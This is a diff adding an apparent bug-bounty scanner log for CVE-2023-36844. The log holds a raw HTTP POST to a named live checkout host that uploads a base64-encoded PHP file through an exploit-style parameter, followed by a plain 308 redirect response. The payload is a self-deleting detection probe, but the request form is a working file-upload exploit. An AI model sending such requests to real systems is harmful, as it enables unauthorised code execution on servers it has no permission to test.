@@ -1,0 +1,30 @@
+[CVE-2023-36844] Dumped HTTP request for http://checkout.bitpanda.com/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: checkout.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "cabac.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response http://checkout.bitpanda.com/webauth_operation.php
+
+HTTP/1.1 308 Permanent Redirect
+Connection: close
+Content-Length: 164
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:46 GMT
+Location: https://checkout.bitpanda.com/webauth_operation.php
+
+<html>
+<head><title>308 Permanent Redirect</title></head>
+<body>
+<center><h1>308 Permanent Redirect</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
